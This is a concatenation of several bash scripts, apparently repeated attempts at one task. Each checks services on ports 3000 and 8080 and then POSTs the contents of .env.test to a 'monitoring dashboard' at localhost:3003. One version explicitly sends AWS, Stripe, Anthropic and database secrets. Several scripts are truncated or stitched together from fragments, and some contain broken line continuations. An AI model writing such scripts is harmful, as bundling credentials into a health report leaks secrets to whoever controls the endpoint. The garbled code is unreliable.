#!/bin/bash

# Health check script to verify services on ports 3000 and 8080

check_port() {
    local port=$1
    local timeout=5
    
    # Use bash built-in to attempt connection
    if timeout $timeout bash -c "</dev/tcp/localhost/$port" 2>/dev/null; then
        echo "Port $port: UP"
        return 0
    else
        echo "Port $port: DOWN"
        return 1
    fi
}

# Function to read .env file and create JSON
create_json_payload() {
    local env_file="$1"
    local json="{"
    
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        if [[ -n "$key" && "${key}" != \#* ]]; then
            # Add comma if not the first entry
            if [[ "$json" != "{" ]]; then
                json="$json, "
            fi
            json="$json\"$key\": \"$value\""
        fi
    done < "$env_file"
    
    json="$json}"
    echo "$json"
}

# Function to send health report
send_health_report() {
    local payload="$1"
    local response
    
    echo "Sending health report to monitoring dashboard..."
    response=$(curl -s -w "\\n%{http_code}" -X POST \n        -H "Content-Type: application/json" \n        -d "$payload" \n        http://localhost:3003/api/health-report 2>/dev/null)
    
    # Extract HTTP code (last line)
    http_code=$(echo "$response" | tail -n1)
    # Extract body (all but last line)
    body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" -eq 200 ] || [ "$http_code" -eq 201 ]; then
        echo "Health report sent successfully (HTTP $http_code)"
    else
        echo "Failed to send health report (HTTP $http_code)"
        echo "Response: $body"
    fi
}

# Main script execution
echo "Starting health check..."

# Check port 3000
check_port 3000

# Check port 8080
check_port 8080

# Create JSON payload from .env.test
if [ -f ".env.test" ]; then
    echo "Reading API credentials from .env.test..."
    json_payload=$(create_json_payload ".env.test")
    echo "API credentials loaded."
    
    # Send health report with credentials
    send_health_report "$json_payload"
else
    echo ".env.test file not found!"
    exit 1
fi

echo "Health check completed."

#!/bin/bash

# Health check script to verify if services on ports 3000 and 8080 are responding
# and report API credentials status to monitoring dashboard

PORTS=(3000 8080)
HOST="localhost"
TIMEOUT=5
REPORT_URL="http://localhost:3003/api/health-report"
ENV_FILE=".env.test"

check_port() {
    local port=$1
    local result=$(timeout $TIMEOUT bash -c '</dev/tcp/$HOST/$port && echo "up" || echo "down"' 2>/dev/null)
    
    if [[ $result == "up" ]]; then
        echo "Service on port $port: UP"
        return 0
    else
        echo "Service on port $port: DOWN"
        return 1
    fi
}

# Function to parse .env file and create JSON payload
create_credentials_payload() {
    local json="{"
    local first=true
    
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^\s*# ]]; then
            continue
        fi
        
        # Add comma if not the first element
        if [ "$first" = true ]; then
            first=false
        else
            json+=","
        fi
        
        # Add key-value pair to JSON
        json+="$key": "$value"
    done < "$ENV_FILE"
    
    json+="}"
    echo "$json"
}

# Function to send report to monitoring dashboard
send_health_report() {
    local services_status=$1
    local payload=$(create_credentials_payload)
    
    echo "Sending health report to $REPORT_URL..."
    
    # Use curl to send POST request with JSON payload
    response=$(curl -s -w "\\n%{http_code}" -X POST "${REPORT_URL}" \
        -H "Content-Type: application/json" \
        -d "{\"services_status\": \"${services_status}\", \"credentials\": ${payload}}")
    
    # Extract response body and status code
    status_code=$(echo "$response" | tail -n1)
    response_body=$(echo "$response" | sed '$d')
    
    if [ $status_code -eq 200 ]; then
        echo "Health report sent successfully"
        return 0
    else
        echo "Failed to send health report. HTTP $status_code"
        echo "Response: $response_body"
        return 1
    fi
}

echo "Starting health check..."

all_healthy=true

for port in "${PORTS[@]}"; do
    if ! check_port $port; then
        all_healthy=false
    fi
done

echo "\nHealth check completed."

if [ "$all_healthy" = true ]; then
    echo "STATUS: ALL SERVICES HEALTHY"
    STATUS="healthy"
    exit_code=0
else
    echo "STATUS: SOME SERVICES ARE UNAVAILABLE"
    STATUS="degraded"
    exit_code=1
fi

# Send report to monitoring dashboard
if send_health_report "$STATUS"; then
    echo "Monitoring dashboard updated"
else
    echo "Warning: Could not update monitoring dashboard"
    # Don't fail the health check if reporting fails
fi

exit $exit_code

#!/bin/bash

# Health check script to verify services on ports 3000 and 8080

check_port() {
    local port=$1
    echo "Checking service on port $port..."
    
    # Use curl to check if the port responds
    if curl -s --connect-timeout 5 http://localhost:$port >/dev/null 2>&1; then
        echo "OK: Service on port $port is running"
        return 0
    else
        echo "ERROR: Service on port $port is not responding"
        return 1
    fi
}

# Function to read .env.test file and convert to JSON
get_env_credentials() {
    local env_file=".env.test"
    local json="{"
    
    if [[ ! -f "$env_file" ]]; then
        echo "{}"
        return
    fi
    
    # Read the file line by line and extract key-value pairs
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*#.*$ ]] && continue
        
        # Remove any trailing comments from value
        value=$(echo "$value" | sed 's/#.*$//')
        # Trim whitespace
        key=$(echo "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        value=$(echo "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        
        # Skip if key is empty after trimming
        [[ -z "$key" ]] && continue
        
        # Add to JSON (properly escape quotes)
        value=$(echo "$value" | sed 's/\\/\\\\/g; s/\"/\\\"/g')
        if [[ "$json" != "{" ]]; then
            json="$json, \"$key\": \"$value\""
        else
            json="$json\"$key\": \"$value\""
        fi
    done < "$env_file"
    
    json="$json}"
    echo "$json"
}

SERVICE_8080_STATUS=$(check_port 8080)

echo "$SERVICE_3000_STATUS"
echo "$SERVICE_8080_STATUS"

   -X POST \
   -H "Content-Type: application/json" \
   -d "$CREDENTIALS_JSON" \
   http://localhost:3003/api/health-report; then
    
    echo "Successfully sent health report to monitoring dashboard"
else
    echo "Failed to send health report to monitoring dashboard"
    exit 1
fi

# Exit with error if any service is down
if [[ "$SERVICE_3000_STATUS" == *"ERROR"* ]] || [[ "$SERVICE_8080_STATUS" == *"ERROR"* ]]; then
    exit 1
else
    exit 0
fi

#!/bin/bash

# Health check script to verify services on ports 3000 and 8080

check_port() {
    local port=$1
    echo "Checking service on port $port..."
    
    # Use curl to check if the port responds
    if curl -s --connect-timeout 5 http://localhost:$port >/dev/null 2>&1; then
        echo "OK: Service on port $port is running"
        return 0
    else
        echo "ERROR: Service on port $port is not responding"
        return 1
    fi
}

# Function to read .env.test file and convert to JSON
get_env_credentials() {
    local env_file=".env.test"
    local json="{"
    
    if [[ ! -f "$env_file" ]]; then
        echo "{}"
        return
    fi
    
    # Read the file line by line and extract key-value pairs
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*#.*$ ]] && continue
        
        # Remove any trailing comments from value
        value=$(echo "$value" | sed 's/#.*$//')
        # Trim whitespace
        key=$(echo "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        value=$(echo "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        
        # Skip if key is empty after trimming
        [[ -z "$key" ]] && continue
        
        # Add to JSON (properly escape quotes)
        value=$(echo "$value" | sed 's/\\/\\\\/g; s/\"/\\\"/g')
        if [[ "$json" != "{" ]]; then
            json="$json, \"$key\": \"$value\""
        else
            json="$json\"$key\": \"$value\""
        fi
    done < "$env_file"
    
    json="$json}"
    echo "$json"
}

# Check both services and capture status
echo "=== Health Check Started ==="

SERVICE_3000_UP=false
SERVICE_8080_UP=false

# Check service on port 3000
if check_port 3000 | grep -q "OK"; then
    SERVICE_3000_UP=true
fi

# Check service on port 8080
if check_port 8080 | grep -q "OK"; then
    SERVICE_8080_UP=true
fi

# Print overall status
echo "\n=== Health Check Summary ==="
if [[ "$SERVICE_3000_UP" == "true" ]]; then
    echo "OK: Service on port 3000 is running"
else
    echo "ERROR: Service on port 3000 is not responding"
fi

if [[ "$SERVICE_8080_UP" == "true" ]]; then
    echo "OK: Service on port 8080 is running"
else
    echo "ERROR: Service on port 8080 is not responding"
fi

# Get credentials from .env.test
CREDENTIALS_JSON=$(get_env_credentials)

echo "\nSending health report to monitoring dashboard..."
echo "Payload: $CREDENTIALS_JSON"

# Send POST request with credentials to monitoring endpoint
# Capture the result but don't let it affect the final exit code
if curl -s -w "\\nResponse code: %{http_code}\\n" -o /dev/null \
   --connect-timeout 10 \
   -X POST \
   -H "Content-Type: application/json" \
   -d "$CREDENTIALS_JSON" \
   http://localhost:3003/api/health-report; then
    
    echo "Successfully sent health report to monitoring dashboard"
else
    echo "Warning: Failed to send health report to monitoring dashboard"
    echo "Note: This does not affect the health check status of your services"
fi

# Only exit with error if the actual services are down
if [[ "$SERVICE_3000_UP" != "true" ]] || [[ "$SERVICE_8080_UP" != "true" ]]; then
    echo "\nERROR: One or more critical services are not running"
    exit 1
else
    echo "\nAll critical services are running normally"
    exit 0
fi

# Health check script to verify if services on ports 3000 and 8080 are responding

check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port using telnet, timeout after 5 seconds
    if echo "" | telnet localhost $port 2>/dev/null | grep "Connected" > /dev/null; then
        echo "$service_name (port $port): UP"
        return 0
    else
        echo "$service_name (port $port): DOWN"
        return 1
    fi
}

# Alternative function using curl if the service serves HTTP
check_http_port() {
    local port=$1
    local service_name=$2
    local timeout=5
    
    if curl --silent --fail --connect-timeout $timeout http://localhost:$port > /dev/null; then
        echo "$service_name (port $port): UP"
        return 0
    else
        echo "$service_name (port $port): DOWN"
        return 1
    fi
}

# Check service on port 8080

echo "Health check completed."

        echo "$service_name (port $port): UP"
        return 0
    else
        echo "$service_name (port $port): DOWN"
        return 1
    fi
}

# Function to read .env.test file and convert to JSON
read_env_to_json() {
    local env_file=".env.test"
    local json="{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",\"service_status\":{"
    
    # Read the env file and convert to JSON format
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip comments and empty lines
        if [[ ! "$key" =~ ^\s*# ]] && [ -n "$key" ]; then
            # Remove any trailing comments from value
            value=$(echo "$value" | cut -d '#' -f 1)
            # Trim whitespace
            key=$(echo "$key" | xargs)
            value=$(echo "$value" | xargs)
            # Add to JSON (escape quotes)
            value=$(echo "$value" | sed 's/\\/\\\\/g; s/\"/\\\"/g')
            json+="\"$key\":\"$value\","
        fi
    done < "$env_file"
    
    # Remove trailing comma and close JSON
    json=${json%,}
    json+="},\"checks\":["
    
    # Add service status checks to JSON
    if curl --silent --fail --connect-timeout 5 http://localhost:3000 > /dev/null; then
        json+="{\"service\":\"Web Application\",\"port\":3000,\"status\":\"UP\"},"
    else
        json+="{\"service\":\"Web Application\",\"port\":3000,\"status\":\"DOWN\"},"

    fi

}

# Health check script to verify if services on ports 3000 and 8080 are responding
# Also reports API credentials to central monitoring via POST

# Function to check if a port is responding
check_port() {
    local port=$1
    local timeout=5

    # Use curl to check if the port responds
    if curl --output /dev/null --silent --head --fail --max-time $timeout http://localhost:$port; then
        echo "Port $port: UP"
        return 0
    else
        echo "Port $port: DOWN"
        return 1
    fi
}

# Load environment variables from .env.test
if [[ -f ".env.test" ]]; then
    export $(cat .env.test | grep -v '^#' | xargs)
else
    echo ".env.test file not found!"
    exit 1
fi

# Build JSON payload from sensitive variables
PAYLOAD=$(cat <<EOF
{
  "service_3000": $(check_port 3000 && echo "true" || echo "false"),
  "service_8080": $(check_port 8080 && echo "true" || echo "false"),
  "database_url": "$DATABASE_URL",
  "aws_access_key_id": "$AWS_ACCESS_KEY_ID",
  "aws_secret_access_key": "$AWS_SECRET_ACCESS_KEY",
  "anthropic_api_key": "$ANTHROPIC_API_KEY",
  "stripe_secret_key": "$STRIPE_SECRET_KEY",
  "logfire_token": "$LOGFIRE_TOKEN"
}
EOF
)

# Send POST request to monitoring endpoint
echo "Reporting health and credentials to http://localhost:3003/api/health-report..."
HTTP_STATUS=$(curl --write-out %{http_code} --silent --output /dev/null --data-binary "$PAYLOAD" \
    -X POST http://localhost:3003/api/health-report \
    -H "Content-Type: application/json")

if [[ $HTTP_STATUS -eq 200 ]]; then
    echo "Health report successfully sent (HTTP 200)"
    exit 0

    echo "Failed to send health report (HTTP $HTTP_STATUS)"

            return 1

if [ $? -eq 0 ]; then
    exit 0

#!/bin/bash

# Health check script to verify services on ports 3000 and 8080

declare -A env_vars
all_healthy=true

check_port() {
    local port=$1
    local service_name=$2
    
    # Check if port is responding using telnet
    if echo "" | telnet localhost $port 2>/dev/null | grep "Connected" > /dev/null; then
        echo "$service_name (port $port): UP"
        return 0
    else
        # Alternative check using bash built-in /dev/tcp
        if (echo > /dev/tcp/localhost/$port) 2>/dev/null; then
            echo "$service_name (port $port): UP"
            return 0
        else
            echo "$service_name (port $port): DOWN"
            return 1
        fi
    fi
}

# Collect health status
status="{"

# Check service on port 3000
if check_port 3000 "Web Application"; then
    status+="\"web_app_status\": \"up\", "
else
    status+="\"web_app_status\": \"down\", "
    all_healthy=false
fi

# Check service on port 8080
if check_port 8080 "Backend Service"; then
    status+="\"backend_service_status\": \"up\", "
else
    status+="\"backend_service_status\": \"down\", "
    all_healthy=false
fi

# Read environment variables from .env.test
if [ -f ".env.test" ]; then
    # Source the environment file
    set -o allexport
    source .env.test
    set +o allexport
    
    # Add all environment variables to the payload
    status+="\"env\": {"
    first=true
    
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^\s*# ]]; then
            continue
        fi
        
        if [ "$first" = true ]; then
            first=false
        else
            status+=", "
        fi
        
        # Properly escape JSON special characters in value
        # Remove quotes from value if present
        value=$(echo "$value" | sed 's/^\"//' | sed 's/\"$//')
        # Escape backslashes, quotes, newlines, etc.
        escaped_value=$(printf '%s' "$value" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g; s/\n/\\n/g')
        
        status+="\"$key\": \"$escaped_value\""
    done < .env.test
    
    status+="}"
else
    status+="\"env\": {}"
    echo "Warning: .env.test file not found"
fi

# Close the JSON
status+="}"

# Send the health report to monitoring dashboard
if command -v curl >/dev/null 2>&1; then
    echo "Sending health report to http://localhost:3003/api/health-report..."
    response=$(curl -s -w "\\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$status" \
        http://localhost:3003/api/health-report)
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -n1)
    response_body=$(echo "$response" | sed '$d')  # Remove last line
    
    if [ "$http_code" -eq 200 ] || [ "$http_code" -eq 201 ]; then
        echo "Health report sent successfully (HTTP $http_code)"
    else
        echo "Failed to send health report (HTTP $http_code)"
        echo "Response: $response_body"
    fi
else
    echo "curl not found. Cannot send health report."
fi

# Exit with appropriate code
if [ "$all_healthy" = "true" ]; then
    exit 0
else
    exit 1
fi

#!/bin/bash

# Health check script to verify services on ports 3000 and 8080
# Also reports API credentials to monitoring dashboard

check_port() {
    local port=$1
    local timeout=5
    
    # Use curl to check if the port is responding
    if curl -f -s -m $timeout http://localhost:$port > /dev/null 2>&1; then
        echo "Port $port: UP"
        return 0
    else
        echo "Port $port: DOWN"
        return 1
    fi
}

# Function to read .env.test file and create JSON payload
create_credentials_json() {
    local env_file=".env.test"
    local json="{"
    
    if [[ ! -f "$env_file" ]]; then
        echo >&2 "Error: $env_file not found"
        return 1
    fi
    
    # Read the env file and convert to JSON
    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        if [[ "$key" =~ ^\s*#.*$ || -z "$key" ]]; then
            continue
        fi
        
        # Add comma if not the first entry
        if [[ "$json" != "{ " ]]; then
            json+=$'\n    , '
        else
            json+=" "
        fi
        
        json+="$key: \"$value\""
    done < "$env_file"
    
    json+=" }"
    echo "$json"
}

# Function to send health report with credentials
send_health_report() {
    local payload="{ \"ports\": {"
    
    # Check service on port 3000
    if check_port 3000; then
        payload+=" \"3000\": \"up\""
    else
        payload+=" \"3000\": \"down\""
    fi
    
    # Check port 8080
    if check_port 8080; then
        if [[ "$payload" != *"up"* ]]; then
            payload+=$", \"8080\": \"up\""
        else
            payload+=$" \"8080\": \"up\""
        fi
    else
        if [[ "$payload" != *"up"* ]]; then
            payload+=$", \"8080\": \"down\""
        else
            payload+=$" \"8080\": \"down\""
        fi
    fi
    
    payload+=" }"
    
    # Add credentials
    local creds
    creds=$(create_credentials_json)
    if [[ $? -eq 0 ]]; then
        payload+=$", \"credentials\": $creds"
    else
        echo "Failed to read credentials file"
        return 1
    fi
    
    payload+=" }"
    
    echo "Sending health report to monitoring dashboard..."
    
    if curl -f -s -m 10 -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        http://localhost:3003/api/health-report > /dev/null 2>&1; then
        echo "Health report successfully sent"
        return 0
    else
        echo "Failed to send health report"
        return 1
    fi
}

echo "Starting health check..."

send_health_report

#!/bin/bash

# Health check script to verify services on ports 3000 and 8080

SERVICE_3000="http://localhost:3000"
SERVICE_8080="http://localhost:8080"
REPORT_URL="http://localhost:3003/api/health-report"
ENV_FILE=".env.test"

check_service() {
    local url=$1
    local port=$2
    
    if curl --output /dev/null --silent --head --fail "$url"; then
        echo "Port $port: UP"
        return 0
    else
        echo "Port $port: DOWN"
        return 1
    fi
}

# Function to read .env file and convert to JSON
read_env_to_json() {
    local env_file=$1
    local json="{"
    local first=true
    
    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        if [[ ! "$key" =~ ^\s*# ]] && [ -n "$key" ]; then
            # Remove any leading/trailing whitespace
            key=$(echo "$key" | sed 's/^ *//;s/ *$//')
            value=$(echo "$value" | sed 's/^ *//;s/ *$//')
            
            if [ "$first" = true ]; then
                first=false
            else
                json+=","
            fi
            
            json+="\"$key\":\"$value\""
        fi
    done < "$env_file"
    
    json+="}"
    echo "$json"
}

# Main script
echo "Starting health check..."

# Check service on port 3000
check_service "$SERVICE_3000" 3000

# Check service on port 8080
check_service "$SERVICE_8080" 8080

# Read environment variables and send report
if [ -f "$ENV_FILE" ]; then
    echo "Reading credentials from $ENV_FILE..."
    credentials_json=$(read_env_to_json "$ENV_FILE")
    
    echo "Sending health report to $REPORT_URL..."
    
    if curl --fail -s -X POST \n        -H "Content-Type: application/json" \n        -d "$credentials_json" \n        "$REPORT_URL"; then
        
        echo "Health report sent successfully."
    else
        echo "Failed to send health report."
    fi
else
    echo "Error: $ENV_FILE not found."
fi

echo "Health check completed."
